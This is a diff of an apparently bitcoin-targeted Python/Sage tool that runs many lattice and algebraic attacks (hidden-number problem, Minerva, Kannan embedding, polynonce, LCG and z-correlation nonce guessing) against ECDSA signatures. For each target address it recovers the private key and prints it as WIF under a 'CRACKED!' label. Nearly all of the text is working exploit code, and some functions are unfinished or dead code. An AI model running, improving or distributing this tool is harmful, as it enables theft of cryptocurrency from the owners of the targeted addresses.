+    row_C = 2 * num
+    for i in range(num - 1):
+        val = K[i+1]
+        if val > N // 2: val -= N
+        M[row_C, i] = val * S_L
+    M[row_C, 2 * num] = W_1
+    
     M_r = progressive_reduce(M) if progressive else M.LLL()
+    
+    # Extract
     for row in M_r:
-        val = row[2 * num]
-        if val == 0:
-            continue
-        for sign in [1, -1]:
-            cand = (sign * exact_div(val, W_x)) % N
-            if cand != 0 and verify_key(pub, cand):
-                return cand
+        if row[2 * num] == 0: continue
+        sign = 1 if row[2 * num] > 0 else -1
+        
+        dL0_val = int(row[num - 1]) * sign
+        dH0_val = int(row[2 * num - 1]) * sign
+        
+        dL0 = exact_div(dL0_val, S_L)
+        dH0 = exact_div(dH0_val, S_H)
+        
+        L0 = dL0 + mu_L
+        H0 = dH0 + mu_H
+        
+        # d = (L_0 + H_0 2^136 - A_0) * T_0^-1 mod N
+        d_cand = ((L0 + H0 * shift_H - A[0]) * T0_inv) % N
+        if verify_key_fast(pub, d_cand):
+            return d_cand
+        
     return None
 
 
@@ -738,38 +920,42 @@ def solve_middle_bits(pub, sigs, window_bits, start_bit, progressive=False):
 # ATTACK 10: LINEAR NONCE BIAS
 # ██████████████████████████████████████████████████████████████████████████████
 def solve_linear_nonce(pub, sigs, bias_bits, progressive=False):
+    """Linear nonce bias: nonces have bias_bits of bias (small deviation from some base).
+    Uses differential HNP: k_i - k_0 is small (bounded by 2^bias_bits)."""
     sigs = sigs[:MAX_SIGS]
     num = len(sigs)
-    B = 2 ** bias_bits
-    dim = num + 3
+    if num < 3:
+        return None
+    r0 = int(sigs[0]['r'], 16)
+    s0 = int(sigs[0]['s'], 16)
+    z0 = int(sigs[0]['z'], 16)
+    s0_inv = int(inverse_mod(s0, N))
+    m = num - 1
+    W = 2 ** (256 - bias_bits)  # optimal scaling factor
+    dim = m + 2
     M = Matrix(ZZ, dim, dim)
-    for i in range(num):
-        r_i = int(sigs[i]['r'], 16)
-        s_i = int(sigs[i]['s'], 16)
-        z_i = int(sigs[i]['z'], 16)
-        M[i, i] = N
-        M[num, i] = (s_i * z_i) % N
-        M[num + 1, i] = s_i % N
-        M[num + 2, i] = (-r_i) % N
-    M[num, num] = B
-    M[num + 1, num + 1] = B
-    M[num + 2, num + 2] = B
+    
+    # Expected difference is 0, so no mu shifting needed.
+    # We want y_i = k_i - k_0 to be bounded by 2^bias_bits.
+    # So y_i * W is bounded by N.
+    for i in range(m):
+        ri = int(sigs[i + 1]['r'], 16)
+        si = int(sigs[i + 1]['s'], 16)
+        zi = int(sigs[i + 1]['z'], 16)
+        si_inv = int(inverse_mod(si, N))
+        t_i = ((ri * si_inv) - (r0 * s0_inv)) % N
+        a_i = ((zi * si_inv) - (z0 * s0_inv)) % N
+        M[i, i] = N * W
+        M[m, i] = t_i * W
+        M[m + 1, i] = a_i * W
+    M[m, m] = 1
+    M[m + 1, m + 1] = N
     M_r = progressive_reduce(M) if progressive else M.LLL()
-    for row in M_r:
-        for col in [num, num + 1, num + 2]:
-            val = row[col]
-            if val == 0:
-                continue
-            for sign in [1, -1]:
-                cand = (sign * exact_div(val, B)) % N
-                if cand != 0 and verify_key(pub, cand):
-                    return cand
-    return None
+    return extract_key(M_r, m, 1, pub)
 
 
 # ██████████████████████████████████████████████████████████████████████████████
 # ATTACK 11: SHARED LSB NONCE (FIXED SUFFIX)
-# ██████████████████████████████████████████████████████████████████████████████
 def solve_shared_lsb(pub, sigs, shared_bits, progressive=False):
     sigs = sigs[:MAX_SIGS]
     num = len(sigs)
@@ -780,7 +966,9 @@ def solve_shared_lsb(pub, sigs, shared_bits, progressive=False):
     z0 = int(sigs[0]['z'], 16)
     s0_inv = int(inverse_mod(s0, N))
     m = num - 1
-    B = 2 ** (256 - shared_bits)
+    
+    # We divided out 2^shared_bits, so the remaining diff y_i is bounded by 2^(256 - shared_bits)
+    W = 2 ** shared_bits
     shift_inv = int(inverse_mod(2 ** shared_bits, N))
     dim = m + 2
     M = Matrix(ZZ, dim, dim)
@@ -790,132 +978,400 @@ def solve_shared_lsb(pub, sigs, shared_bits, progressive=False):
         zi = int(sigs[i + 1]['z'], 16)
         si_inv = int(inverse_mod(si, N))
         t_i = (((ri * si_inv) - (r0 * s0_inv)) * shift_inv) % N
-        a_i = ((((zi * si_inv) - (z0 * s0_inv)) * shift_inv) - B // 2) % N
-        M[i, i] = N * N
-        M[m, i] = t_i * N
-        M[m + 1, i] = a_i * N
-    M[m, m] = B
-    M[m + 1, m + 1] = B * N
+        a_i = (((zi * si_inv) - (z0 * s0_inv)) * shift_inv) % N
+        M[i, i] = N * W
+        M[m, i] = t_i * W
+        M[m + 1, i] = a_i * W
+    M[m, m] = 1
+    M[m + 1, m + 1] = N
     M_r = progressive_reduce(M) if progressive else M.LLL()
-    return extract_key(M_r, m, B, pub)
+    return extract_key(M_r, m, 1, pub)
 
 
-# ██████████████████████████████████████████████████████████████████████████████
-# ATTACK 12: SEQUENTIAL NONCE (WINDOWED)
-# ██████████████████████████████████████████████████████████████████████████████
-def solve_sequential_nonce(pub, sigs, err_bits, progressive=False):
-    sigs = sigs[:MAX_SIGS]
-    num = len(sigs)
-    if num < 4:
-        return None
-    r0 = int(sigs[0]['r'], 16)
-    s0 = int(sigs[0]['s'], 16)
-    z0 = int(sigs[0]['z'], 16)
-    s0_inv = int(inverse_mod(s0, N))
-    m = num - 1
-    B = 2 ** (err_bits + 1)
-    dim = m + 2
-    M = Matrix(ZZ, dim, dim)
-    for i in range(m):
-        ri = int(sigs[i + 1]['r'], 16)
-        si = int(sigs[i + 1]['s'], 16)
-        zi = int(sigs[i + 1]['z'], 16)
-        si_inv = int(inverse_mod(si, N))
-        t_i = ((ri * si_inv) - (r0 * s0_inv)) % N
-        a_i = (((zi * si_inv) - (z0 * s0_inv)) - B // 2) % N
-        M[i, i] = N * N
-        M[m, i] = t_i * N
-        M[m + 1, i] = a_i * N
-    M[m, m] = B
-    M[m + 1, m + 1] = B * N
-    M_r = progressive_reduce(M) if progressive else M.LLL()
-    return extract_key(M_r, m, B, pub)
 
-
-# ██████████████████████████████████████████████████████████████████████████████
-# ATTACK 13: KANNAN EMBEDDING (CVP → SVP)
-# ██████████████████████████████████████████████████████████████████████████████
 def solve_kannan_embedding(pub, sigs, leaked_bits, progressive=False):
+    """True Kannan embedding: converts CVP to SVP by appending the target vector.
+    Since build_msb_lattice is now an optimal embedded SVP, we just use it directly."""
     sigs = sigs[:MAX_SIGS]
-    M, B, key_col = build_msb_lattice(sigs, leaked_bits)
+    M, scale, key_col = build_msb_lattice(sigs, leaked_bits)
     M_r = progressive_reduce(M) if progressive else M.LLL()
-    return extract_key(M_r, key_col, B, pub)
+    d = extract_key(M_r, key_col, scale, pub)
+    if d:
+        return d
+    return extract_key_extended(M_r, key_col, scale, pub)
 
-
-# ██████████████████████████████████████████████████████████████████████████████
-# ATTACK 14 & 15: PROGRESSIVE REDUCED BKZ MSB/LSB
-# ██████████████████████████████████████████████████████████████████████████████
-def build_reduced_lattice(sigs, leaked_bits, root_idx=0, is_lsb=False):
-    num = len(sigs)
-    B = 2 ** (256 - leaked_bits)
-    if is_lsb:
-        shift_inv = int(inverse_mod(2 ** leaked_bits, N))
-    else:
-        shift_inv = 1
-    root_sig = sigs[root_idx]
-    r_root = int(root_sig['r'], 16)
-    s_root = int(root_sig['s'], 16)
-    z_root = int(root_sig['z'], 16)
-    r_root_inv = int(inverse_mod(r_root, N))
-    dim = num + 1
-    M = Matrix(ZZ, dim, dim)
-    row_idx = 0
-    for i in range(num):
-        if i == root_idx:
-            continue
-        r_i = int(sigs[i]['r'], 16)
-        s_i = int(sigs[i]['s'], 16)
-        z_i = int(sigs[i]['z'], 16)
-        s_inv = int(inverse_mod(s_i, N))
-        t_prime = (s_inv * r_i * s_root * r_root_inv) % N
-        a_prime = (s_inv * (z_i - r_i * z_root * r_root_inv)) % N
-        if is_lsb:
-            a_prime = (a_prime * shift_inv) % N
-        a_centered = (a_prime + t_prime * (B // 2) - B // 2) % N
-        M[row_idx, row_idx] = N
-        M[dim - 2, row_idx] = t_prime
-        M[dim - 1, row_idx] = a_centered
-        row_idx += 1
-    M[dim - 2, dim - 2] = 1
-    M[dim - 1, dim - 1] = B
-    return M, B
-
-def extract_reduced_key(M_r, B, root_sig, is_lsb, leaked_bits, pub):
-    for row in M_r:
-        val = row[M_r.ncols() - 2]
-        if val == 0:
-            continue
-        for sign in [1, -1]:
-            k_prime_root = sign * int(val)
-            k_root_derived = (k_prime_root + B // 2) % N
-            if is_lsb:
-                k_true = (k_root_derived * (2 ** leaked_bits)) % N
-            else:
-                k_true = k_root_derived
-            r_root = int(root_sig['r'], 16)
-            s_root = int(root_sig['s'], 16)
-            z_root = int(root_sig['z'], 16)
-            x_cand = ((k_true * s_root - z_root) * int(inverse_mod(r_root, N))) % N
-            if x_cand != 0 and verify_key(pub, x_cand):
-                return x_cand
-    return None
-
-def solve_progressive_reduced(pub, sigs, leaked_bits, is_lsb):
-    sigs = sigs[:MAX_SIGS]
-    num = len(sigs)
-    for root_idx in range(min(5, num)):
-        M, B = build_reduced_lattice(sigs, leaked_bits, root_idx, is_lsb)
-        M_r = progressive_reduce(M)
-        d = extract_reduced_key(M_r, B, sigs[root_idx], is_lsb, leaked_bits, pub)
-        if d:
-            return d
-    return None
 
 def solve_progressive_msb(pub, sigs, leaked_bits):
-    return solve_progressive_reduced(pub, sigs, leaked_bits, False)
+    M, B, key_col = build_msb_lattice(sigs, leaked_bits)
+    M_r = progressive_reduce(M)
+    d = extract_key(M_r, key_col, B, pub)
+    if d:
+        return d
+    return extract_key_extended(M_r, key_col, B, pub)
 
 def solve_progressive_lsb(pub, sigs, leaked_bits):
-    return solve_progressive_reduced(pub, sigs, leaked_bits, True)
+    M, B, key_col = build_lsb_lattice(sigs, leaked_bits)
+    M_r = progressive_reduce(M)
+    d = extract_key(M_r, key_col, B, pub)
+    if d:
+        return d
+    return extract_key_extended(M_r, key_col, B, pub)
+
+
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+# ATTACK 13: MINERVA VARIABLE-BITLENGTH HNP
+# ██████████████████████████████████████████████████████████████████████████████
+def solve_minerva_variable(pub, sigs, sig_data=None):
+    """Minerva-style HNP: per-signature scaling based on actual r/s bit-length.
+    Unlike standard HNP which uses uniform leaked_bits for all sigs, this uses
+    the measured bit-length of each r_i/s_i as individual leak estimates.
+    Much more powerful when signatures have varying bias levels."""
+    n = min(len(sigs), 50)
+    sigs = sigs[:n]
+    if n < 5:
+        return None
+
+    # Measure per-signature leak from r and s bit-lengths
+    leak_info = []
+    for i, sig in enumerate(sigs):
+        r = int(sig['r'], 16)
+        s = int(sig['s'], 16)
+        r_leak = max(0, 256 - r.bit_length())
+        s_leak = max(0, 256 - s.bit_length())
+        leak = max(r_leak, s_leak)
+        if leak > 0:
+            leak_info.append((leak, i))
+
+    if len(leak_info) < 4:
+        return None
+
+    # Sort by leak (most leak first), select best
+    leak_info.sort(reverse=True)
+    use_n = min(len(leak_info), 40)
+    total_leak = sum(l for l, _ in leak_info[:use_n])
+    if total_leak < 260:
+        return None
+
+    sel_idx = [idx for _, idx in leak_info[:use_n]]
+    sel_leaks = [leak for leak, _ in leak_info[:use_n]]
+    sel_sigs = [sigs[i] for i in sel_idx]
+
+    # Build lattice with per-signature W_i scaling
+    dim = use_n + 2
+    M = Matrix(ZZ, dim, dim)
+
+    for i in range(use_n):
+        if sig_data and sel_idx[i] < len(sig_data):
+            t_i = sig_data[sel_idx[i]]['t']
+            a_i = sig_data[sel_idx[i]]['a']
+        else:
+            r_i = int(sel_sigs[i]['r'], 16)
+            s_i = int(sel_sigs[i]['s'], 16)
+            z_i = int(sel_sigs[i]['z'], 16)
+            s_inv = int(inverse_mod(s_i, N))
+            t_i = (r_i * s_inv) % N
+            a_i = (z_i * s_inv) % N
+
+        W_i = 2 ** sel_leaks[i]
+        mu_i = N // (2 * W_i)
+        M[i, i] = N * W_i
+        M[use_n, i] = t_i * W_i
+        M[use_n + 1, i] = (a_i - mu_i) * W_i
+
+    M[use_n, use_n] = 1
+    M[use_n + 1, use_n + 1] = N
+
+    M_r = M.LLL()
+    d = extract_key(M_r, use_n, 1, pub)
+    if d:
+        return d
+    d = extract_key_extended(M_r, use_n, 1, pub)
+    if d:
+        return d
+
+    # Try BKZ-15 refinement
+    try:
+        M_r2 = M_r.BKZ(block_size=min(15, use_n))
+        d = extract_key(M_r2, use_n, 1, pub)
+        if d:
+            return d
+        return extract_key_extended(M_r2, use_n, 1, pub)
+    except Exception:
+        pass
+    return None
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+# ATTACK 14: Z-CORRELATION NONCE DETECTION
+# ██████████████████████████████████████████████████████████████████████████████
+def solve_z_correlation(pub, sigs):
+    """Detect if nonces are derived from z via simple functions.
+    Tests: k=z, k=z>>s, k=z*c, k=z+c, k=N-z, k=byte_reverse(z), k=z^mask.
+    No lattice — pure algebraic verification. Near-instant."""
+    if len(sigs) < 2:
+        return None
+
+    parsed = []
+    for sig in sigs[:30]:
+        r = int(sig['r'], 16)
+        s = int(sig['s'], 16)
+        z = int(sig['z'], 16)
+        s_inv = int(inverse_mod(s, N))
+        t = (r * s_inv) % N
+        a = (z * s_inv) % N
+        t_inv = int(inverse_mod(int(t), N))
+        parsed.append((r, s, z, t, a, t_inv))
+
+    def try_k(k_val, idx=0):
+        """Derive d from candidate k at sig[idx], verify against pubkey."""
+        k_val = int(k_val) % N
+        if k_val == 0:
+            return None
+        _, _, _, t, a, t_inv = parsed[idx]
+        d_cand = ((k_val - a) * t_inv) % N
+        if d_cand != 0 and d_cand < N and verify_key_fast(pub, d_cand):
+            return d_cand
+        return None
+
+    z0 = parsed[0][2]
+
+    # k = z (identity)
+    d = try_k(z0)
+    if d: return d
+
+    # k = N - z (negation)
+    d = try_k(N - z0)
+    if d: return d
+
+    # k = z >> shift
+    for shift in range(1, 33):
+        d = try_k(z0 >> shift)
+        if d: return d
+
+    # k = z * small_c  or  k = z * inv(small_c)
+    for c in range(2, 65):
+        d = try_k((z0 * c) % N)
+        if d: return d
+        d = try_k((z0 * int(inverse_mod(c, N))) % N)
+        if d: return d
+
+    # k = z + small_c
+    for c in range(-128, 129):
+        if c == 0: continue
+        d = try_k((z0 + c) % N)
+        if d: return d
+
+    # k = z XOR small_mask
+    for mask in range(1, 512):
+        d = try_k(z0 ^ mask)
+        if d: return d
+
+    # k = byte_reverse(z)
+    z_bytes = z0.to_bytes(32, 'big')
+    d = try_k(int.from_bytes(z_bytes[::-1], 'big'))
+    if d: return d
+
+    # k = z with pairs of bytes swapped
+    zb = list(z_bytes)
+    for i in range(0, 32, 2):
+        zb[i], zb[i+1] = zb[i+1], zb[i]
+    d = try_k(int.from_bytes(bytes(zb), 'big'))
+    if d: return d
+
+    # Try same models on second sig (different z may reveal pattern)
+    if len(parsed) >= 2:
+        z1 = parsed[1][2]
+        for shift in range(1, 17):
+            d = try_k(z1 >> shift, 1)
+            if d: return d
+        for c in range(2, 33):
+            d = try_k((z1 * c) % N, 1)
+            if d: return d
+
+    return None
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+# ATTACK 15: GENERALIZED LINEAR RECURRENCE DETECTION
+# ██████████████████████████████████████████████████████████████████████████████
+def solve_linear_recurrence(pub, sigs, precomputed_uv=None):
+    """Detect if nonces follow a linear recurrence of order 1-4:
+      Order 1 (LCG):  k_{i+1} = a*k_i + b
+      Order 2 (LFSR): k_i = c1*k_{i-1} + c2*k_{i-2} + c3
+      Order 3/4: higher-order LFSR patterns.
+    Uses tiny lattices (max 6x6) — near-instant."""
+    n = len(sigs)
+    if n < 5:
+        return None
+
+    uv = precomputed_uv if precomputed_uv is not None else precompute_uv(sigs)
+
+    # Order-2 recurrence: k_i = c1*k_{i-1} + c2*k_{i-2} + c3
+    # Substituting k_i = u_i*d + v_i:
+    #   (u_i*d + v_i) = c1*(u_{i-1}*d + v_{i-1}) + c2*(u_{i-2}*d + v_{i-2}) + c3
+    # Rearranging by d:
+    #   d*(u_i - c1*u_{i-1} - c2*u_{i-2}) = c1*v_{i-1} + c2*v_{i-2} + c3 - v_i
+    #
+    # With 5 consecutive sigs, we get 3 equations in 4 unknowns (c1,c2,c3,d).
+    # Use the first 4 equations to build a system.
+
+    for order in [2, 3, 4]:
+        needed = order + 3  # equations needed = order+1 unknowns + 1
+        if n < needed:
+            continue
+
+        for start in range(min(n - needed, 40)):
+            try:
+                num_eq = order + 2
+                # Unknowns: c1, c2, ..., c_{order}, c_{order+1}=constant, d
+                num_unknowns = order + 2
+
+                Zn = Zmod(N)
+                A = Matrix(Zn, num_eq, num_unknowns)
+                b_vec = vector(Zn, num_eq)
+
+                valid = True
+                for eq in range(num_eq):
+                    idx = start + order + eq
+                    if idx >= n:
+                        valid = False
+                        break
+                    u_curr, v_curr = uv[idx]
+
+                    # Equation: d*(u_curr - sum(c_j * u_{idx-j-1})) = sum(c_j * v_{idx-j-1}) + c_const - v_curr
+                    # Rearrange: -d*c1*u_{idx-1} - d*c2*u_{idx-2} ... + c1*v_{idx-1} + ... + c_const + d*u_curr = v_curr
+                    # This is nonlinear in d and c_j.
+
+                    # Alternative: eliminate d using pairs of equations
+                    pass
+
+                if not valid:
+                    continue
+
+                # Simpler approach: for order-2, use lattice on differences
+                # diff_i = k_{i+1} - k_i = u_diff_i * d + v_diff_i
+                # If k follows order-2 recurrence, then:
+                #   diff_i = (c1-1)*k_i + c2*k_{i-1} + c3
+                # diff_{i+1} - c1*diff_i + (1-c1)*c2*k_{i-1} ... gets complicated
+                #
+                # Better: build a lattice from consecutive u-differences
+                m = min(order + 2, n - start - 1)
+                dim = m + 1
+                L = Matrix(ZZ, dim, dim)
+
+                for i in range(m):
+                    i1 = start + i
+                    i2 = start + i + 1
+                    du = (uv[i2][0] - uv[i1][0]) % N
+                    dv = (uv[i2][1] - uv[i1][1]) % N
+                    L[i, i] = N
+                    L[m, i] = du
+
+                L[m, m] = 1
+
+                L_r = L.LLL()
+
+                # Check each row for d
+                for row in L_r:
+                    val = int(row[m])
+                    if val == 0:
+                        continue
+                    for sign in [1, -1]:
+                        d_cand = (sign * val) % N
+                        if d_cand != 0 and verify_key_fast(pub, d_cand):
+                            return d_cand
+            except Exception:
+                continue
+
+    return None
+
+
+# ██████████████████████████████████████████████████████████████████████████████
+# ATTACK 16: EXTENDED POLYNONCE MODELS (k=a*r+b, k=a*z²+b*z+c)
+# ██████████████████████████████████████████████████████████████████████████████
+def solve_polynonce_r_linear(pub, sigs):
+    """Algebraic solve for k_i = a*r_i + b (mod N).
+    Eliminates a,b using 3 sigs to get d directly."""
+    n = len(sigs)
+    if n < 3:
+        return None
+
+    parsed = [(int(s['r'], 16), int(s['s'], 16), int(s['z'], 16)) for s in sigs]
+
+    def try_triple(i, j, k):
+        r0, s0, z0 = parsed[i]
+        r1, s1, z1 = parsed[j]
+        r2, s2, z2 = parsed[k]
+        # From k_m = a*r_m + b and s_m*k_m = z_m + r_m*d:
+        # Eliminate a,b between pairs (0,1) and (0,2):
+        A01 = (s0*r0*s1 - s1*r1*s0) % N
+        C01 = (z0*s1 - z1*s0) % N
+        D01 = (r0*s1 - r1*s0) % N
+        A02 = (s0*r0*s2 - s2*r2*s0) % N
+        C02 = (z0*s2 - z2*s0) % N
+        D02 = (r0*s2 - r2*s0) % N
+        det = (A02*D01 - A01*D02) % N
+        if det == 0:
+            return None
+        try:
+            det_inv = int(inverse_mod(int(det), N))
+        except Exception:
+            return None
+        d_cand = ((A01*C02 - A02*C01) * det_inv) % N
+        if d_cand != 0 and verify_key_fast(pub, d_cand):
+            return d_cand
+        return None
+
+    for i in range(min(n - 2, 60)):
+        d = try_triple(i, i + 1, i + 2)
+        if d:
+            return d
+
+    attempts = 0
+    for i in range(min(n, 10)):
+        for j in range(i + 2, min(n, 20)):
+            for k in range(j + 2, min(n, 30)):
+                d = try_triple(i, j, k)
+                if d:
+                    return d
+                attempts += 1
+                if attempts >= 200:
+                    return None
+    return None
+
+
+def solve_polynonce_quadratic(pub, sigs):
+    """Solve for k_i = a*z_i^2 + b*z_i + c (mod N) — quadratic polynonce.
+    4 unknowns (a,b,c,d), solved with 4 sigs via linear system over Z/NZ."""
+    n = len(sigs)
+    if n < 4:
+        return None
+
+    parsed = [(int(s['r'], 16), int(s['s'], 16), int(s['z'], 16)) for s in sigs]
+
+    for start in range(min(n - 3, 40)):
+        try:
+            Zn = Zmod(N)
+            A_mat = Matrix(Zn, 4, 4)
+            rhs = vector(Zn, 4)
+            for row, idx in enumerate(range(start, start + 4)):
+                ri, si, zi = parsed[idx]
+                # s_i*(a*z_i^2 + b*z_i + c) = z_i + r_i*d
+                # => a*s_i*z_i^2 + b*s_i*z_i + c*s_i - r_i*d = z_i
+                A_mat[row, 0] = Zn(si) * Zn(zi) * Zn(zi)
+                A_mat[row, 1] = Zn(si) * Zn(zi)
+                A_mat[row, 2] = Zn(si)
+                A_mat[row, 3] = Zn(-ri)
+                rhs[row] = Zn(zi)
+            sol = A_mat.solve_right(rhs)
+            d_cand = int(sol[3]) % N
+            if d_cand != 0 and verify_key_fast(pub, d_cand):
+                return d_cand
+        except Exception:
+            continue
+    return None
 
 
 # ==============================================================================
@@ -936,11 +1392,19 @@ def run_attack(name, func, *args, timeout=ATTACK_TIMEOUT):
         return None, elapsed, err_msg
 
 
+
+def worker_run_attack(task):
+    func_name, label, args = task
+    func = globals()[func_name]
+    d, elapsed, err = run_attack(label, func, *args)
+    return label, d, err, elapsed
+
 # ==============================================================================
-# PER-TARGET WORKER — runs all 15 attacks on one target
+# PER-TARGET WORKER — runs all 12 attacks on one target
+
 # ==============================================================================
-def process_target(tgt):
-    """Worker function: runs all 15 attacks on a single target dict.
+def process_target(tgt, num_workers=1):
+    """Worker function: runs all 12 attacks on a single target dict.
     Returns a dict with results, or None if nothing found."""
     address = tgt.get('address', 'Unknown')
     pub = tgt.get('pubkey', 'Unknown')
@@ -952,11 +1416,45 @@ def process_target(tgt):
     if len(sigs) < 4:
         return None
 
-    # Cap sigs for memory safety
-    sigs = sigs[:MAX_SIGS]
-
-    # Normalize s values (Bitcoin low-s rule)
+    # Normalize s values (Bitcoin low-s rule) — must happen before scoring
     sigs = normalize_s(sigs)
+    
+    # Save chronological/unfiltered signatures for sequential attacks
+    raw_sigs = list(sigs)
+
+    # Smart signature selection: when >MAX_SIGS, pick the BEST ones
+    # instead of blindly taking the first MAX_SIGS
+    if len(sigs) > MAX_SIGS:
+        scored = []
+        for idx, sig in enumerate(sigs):
+            r = int(sig['r'], 16)
+            s = int(sig['s'], 16)
+            score = 0
+            # Short r → small nonce MSBs (most valuable signal)
+            r_bits = r.bit_length()
+            if r_bits < 256:
+                score += (256 - r_bits) * 4
+            # Leading zeros in r hex (extremely valuable)
+            r_hex = hex(r)[2:].zfill(64)
+            leading_zeros = len(r_hex) - len(r_hex.lstrip('0'))
+            score += leading_zeros * 12
+            # Short s → potential weak randomness
+            s_bits = s.bit_length()
+            if s_bits < 256:
+                score += (256 - s_bits) * 2
+            # Compute t = r*s_inv mod N — extreme values indicate structure
+            s_inv = int(inverse_mod(s, N))
+            t = (r * s_inv) % N
+            if t < N // 256 or t > N - N // 256:
+                score += 40
+            if t < N // 65536 or t > N - N // 65536:
+                score += 60
+            scored.append((score, idx))
+        scored.sort(reverse=True)
+        # Take top MAX_SIGS by score
+        best_indices = sorted([idx for _, idx in scored[:MAX_SIGS]])
+        sigs = [sigs[i] for i in best_indices]
+        print(f"[*] Selected best {MAX_SIGS} of {len(scored)} signatures (top weakness score)", flush=True)
 
     print(f"\n{'=' * 70}", flush=True)
     print(f"[*] Target: {address}", flush=True)
@@ -966,39 +1464,96 @@ def process_target(tgt):
     target_deadline = target_t0 + 720  # 12 minutes max per target
     result = None  # Will hold recovery dict if successful
 
-    # Precompute uv once for GCD/LCG
-    precomputed_uv_list = precompute_uv(sigs)
+    # Precompute once — shared across all attacks
+    precomputed_uv_list = precompute_uv(raw_sigs)
+    sig_data = precompute_sig_data(sigs)
 
-    # Helper to run and print (real-time output like original tool)
-    def try_attack(label, func, *args):
+    current_tasks = []
+
+    def queue_attack(label, func, *args):
+        current_tasks.append((func.__name__, label, args))
+
+    def flush_phase(phase_name):
         nonlocal result
-        if result is not None:
-            return  # Already cracked
-            
+        if result is not None or not current_tasks:
+            current_tasks.clear()
+            return
+        print(f"\n[{phase_name}]...", flush=True)
         if time.time() > target_deadline:
-            print(f"  -> {label}... SKIPPED (Target deadline exceeded)", flush=True)
+            print("  -> SKIPPED (deadline)", flush=True)
+            current_tasks.clear()
             return
 
-        d, elapsed, err = run_attack(label, func, *args)
-        if err:
-            print(f"  -> {label}... ERROR ({elapsed:.1f}s)", flush=True)
-        elif d:
-            print(f"  -> {label}... CRACKED! ({elapsed:.1f}s)", flush=True)
-            result = {"address": address, "pub": pub, "priv": hex(d),
-                      "priv_wif": privkey_to_wif(d, not pub.startswith('04')),
-                      "bug": label}
+        if num_workers <= 1:
+            for task in current_tasks:
+                func_name, label, args = task
+                if time.time() > target_deadline:
+                    print(f"  -> {label}... SKIPPED (deadline)", flush=True)
+                    continue
+                func = globals()[func_name]
+                d, elapsed, err = run_attack(label, func, *args)
+                if err:
+                    print(f"  -> {label}... ERROR ({elapsed:.1f}s) {err}", flush=True)
+                elif d:
+                    print(f"  -> {label}... CRACKED! ({elapsed:.1f}s)", flush=True)
+                    result = {"address": address, "pub": pub, "priv": hex(d),
+                              "priv_wif": privkey_to_wif(d, not pub.startswith('04')),
+                              "bug": label}
+                    break
+                else:
+                    print(f"  -> {label}... miss ({elapsed:.1f}s)", flush=True)
         else:
-            print(f"  -> {label}... miss ({elapsed:.1f}s)", flush=True)
-        gc.collect()
+            with Pool(processes=num_workers) as pool:
+                for label, d, err, elapsed in pool.imap_unordered(worker_run_attack, current_tasks):
+                    if err:
+                        print(f"  -> {label}... ERROR ({elapsed:.1f}s) {err}", flush=True)
+                    elif d:
+                        print(f"  -> {label}... CRACKED! ({elapsed:.1f}s)", flush=True)
+                        result = {"address": address, "pub": pub, "priv": hex(d),
+                                  "priv_wif": privkey_to_wif(d, not pub.startswith('04')),
+                                  "bug": label}
+                        pool.terminate()
+                        break
+                    else:
+                        print(f"  -> {label}... miss ({elapsed:.1f}s)", flush=True)
+        current_tasks.clear()
 
     # ════════════════ PHASE 0: INSTANT ════════════════════════════════
-    print(f"\n[PHASE 0] Instant Attacks (No Lattice)...", flush=True)
-    try_attack(f"GCD Small-Delta ({len(sigs)} sigs)", solve_gcd_nonce, pub, sigs, 500, precomputed_uv_list)
-    try_attack(f"LCG Phantom ({len(sigs)} sigs)", solve_lcg_phantom, pub, sigs, precomputed_uv_list)
+    
+    if SKIP_GCD:
+        print(f"  -> GCD Small-Delta... SKIPPED (-gcd flag)", flush=True)
+        print(f"  -> LCG Phantom... SKIPPED (-gcd flag)", flush=True)
+    else:
+        queue_attack(f"GCD Small-Delta ({len(raw_sigs)} sigs)", solve_gcd_nonce, pub, raw_sigs, 100, precomputed_uv_list)
+        queue_attack(f"LCG Phantom ({len(raw_sigs)} sigs)", solve_lcg_phantom, pub, raw_sigs, precomputed_uv_list)
+
+        flush_phase("PHASE 0: Instant Attacks (No Lattice)")
+
+    # ════════════════ PHASE 0.5: NOVEL INSTANT ═════════════════════════
+    if result is None:
+        # Z-Correlation (no lattice — tries k=f(z) for many simple f)
+        queue_attack(f"Z-Correlation ({min(len(raw_sigs), 30)} sigs)", solve_z_correlation, pub, raw_sigs)
+
+        # Extended Polynonce: k=a*r+b (different from existing k=a*z+b)
+        if len(raw_sigs) >= 3:
+            queue_attack(f"Polynonce R-Linear ({len(raw_sigs)} sigs)", solve_polynonce_r_linear, pub, raw_sigs)
+
+        # Quadratic Polynonce: k=a*z²+b*z+c
+        if len(raw_sigs) >= 4:
+            queue_attack(f"Polynonce Quadratic ({len(raw_sigs)} sigs)", solve_polynonce_quadratic, pub, raw_sigs)
+
+        # Generalized Linear Recurrence (tiny lattice, near-instant)
+        if len(raw_sigs) >= 5:
+            queue_attack(f"Linear Recurrence Order2-4 ({len(raw_sigs)} sigs)", solve_linear_recurrence, pub, raw_sigs, precomputed_uv_list)
+
+        flush_phase("PHASE 0.5: Novel Instant Attacks")
 
     # ════════════════ PHASE 1: FAST ═══════════════════════════════════
     if result is None:
-        print(f"\n[PHASE 1] Fast (Babai CVP + MC + SLA + Polynonce)...", flush=True)
+
+        # Algebraic Polynonce (instant — no lattice, direct algebra for k=a*z+b)
+        if len(raw_sigs) >= 3:
+            queue_attack(f"Polynonce Algebraic ({len(raw_sigs)} sigs)", solve_polynonce_algebraic, pub, raw_sigs)
 
         for bits in [32, 16, 8, 6]:
             if result is not None:
@@ -1007,61 +1562,51 @@ def process_target(tgt):
             if len(sigs) < req:
                 continue
             use = min(len(sigs), req + 4)
-            try_attack(f"Babai MSB {bits}-bit ({use} sigs)", solve_babai_msb, pub, sigs[:use], bits)
-            try_attack(f"Babai LSB {bits}-bit ({use} sigs)", solve_babai_lsb, pub, sigs[:use], bits)
+            queue_attack(f"Babai MSB {bits}-bit ({use} sigs)", solve_babai_msb, pub, sigs[:use], bits, sig_data[:use])
+            queue_attack(f"Babai LSB {bits}-bit ({use} sigs)", solve_babai_lsb, pub, sigs[:use], bits, sig_data[:use])
 
     # Polynonce (Dario Clavijo Differential)
-    if result is None and len(sigs) >= 4:
+    if result is None and len(raw_sigs) >= 4:
         poly_configs = [
-            (249, 79), (240, 60), (200, 50), (160, 40), (128, 30), (100, 20), (64, 15)
+            (249, 79), (200, 50), (128, 30), (64, 15)
         ]
         for bb, req in poly_configs:
             if result is not None:
                 break
-            if len(sigs) < req:
+            if len(raw_sigs) < req:
                 continue
